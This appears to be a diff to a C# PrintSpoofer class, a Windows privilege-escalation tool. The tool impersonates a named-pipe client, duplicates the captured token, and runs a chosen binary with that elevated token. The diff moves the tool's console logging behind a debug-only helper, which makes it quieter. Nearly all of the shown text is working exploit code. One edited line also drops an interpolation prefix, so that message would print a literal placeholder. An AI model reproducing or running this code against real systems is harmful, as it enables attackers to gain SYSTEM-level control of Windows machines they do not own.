@@ -60,13 +60,13 @@ internal static class PrintSpoofer
             DEFAULT_TIMEOUT,
             IntPtr.Zero
         );
-        Console.WriteLine("Created pipe {0} [{1}]", pipeName, pipe);
-        Console.WriteLine("Waiting for connection...");
+        PrintDebug($"Created pipe {pipeName} [{pipe}]");
+        PrintDebug("Waiting for connection...");
         Lib.ConnectNamedPipe(pipe, IntPtr.Zero);
-        Console.WriteLine("Connected to pipe {0}", pipeName);
+        PrintDebug($"Connected to pipe {pipeName}");
         Lib.ImpersonateNamedPipeClient(pipe);
         Lib.OpenThreadToken(Lib.GetCurrentThread(), TOKEN_ALL_ACCESS, false, out var hToken);
-        Console.WriteLine($"Got token 0x{hToken:X}");
+        PrintDebug($"Got token 0x{hToken:X}");
         int tokenInfoLength = 0;
         Lib.GetTokenInformation(
             hToken,
@@ -87,16 +87,16 @@ internal static class PrintSpoofer
             )
         )
         {
-            Console.WriteLine($"Got token info of length {tokenInfoLength}");
+            PrintDebug($"Got token info of length {tokenInfoLength}");
             var token = (TOKEN_USER?)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_USER));
             if (token != null)
             {
-                Console.WriteLine($"Got token user {token.Value.User.Sid}");
+                PrintDebug($"Got token user {token.Value.User.Sid}");
                 if (Lib.ConvertSidToStringSid(token.Value.User.Sid, out var ptrSid))
                 {
                     var sid = Marshal.PtrToStringAuto(ptrSid);
                     Marshal.FreeHGlobal(ptrSid);
-                    Console.WriteLine($"Found SID {sid}");
+                    PrintDebug($"Found SID {sid}");
                 }
                 Marshal.FreeHGlobal(tokenInfo);
                 Lib.DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out IntPtr hSystemToken);
@@ -105,7 +105,7 @@ internal static class PrintSpoofer
                 _ = Lib.CreateEnvironmentBlock(out nint env, hSystemToken, false);
 
                 var name = WindowsIdentity.GetCurrent().Name;
-                Console.WriteLine("Impersonated user is: " + name);
+                PrintDebug("Impersonated user is: {name}");
 
                 Lib.RevertToSelf();
                 var si = new STARTUPINFO();
@@ -117,7 +117,7 @@ internal static class PrintSpoofer
 
                 if (RuntimeConfig.IsDebugEnabled)
                 {
-                    Console.WriteLine($"Executing \"{binary}\" as {name}");
+                    PrintDebug($"Executing \"{binary}\" as {name}");
                 }
 
                 Lib.CreateProcessWithTokenW(
@@ -132,15 +132,21 @@ internal static class PrintSpoofer
                     out ProcessInformation pi
                 );
 
-                if (pi.dwProcessId != 0 && RuntimeConfig.IsDebugEnabled)
-                    Console.WriteLine($"Impersonation was successful - PID: {pi.dwProcessId}");
+                if (pi.dwProcessId != 0)
+                    PrintDebug($"Impersonation was successful - PID: {pi.dwProcessId}");
 
                 Lib.DisconnectNamedPipe(pipe);
             }
             else
             {
-                Console.WriteLine("Failed to get token user");
+                PrintDebug("Failed to get token user");
             }
         }
+    }
+
+    private static void PrintDebug(string message)
+    {
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine(message);
     }
 }
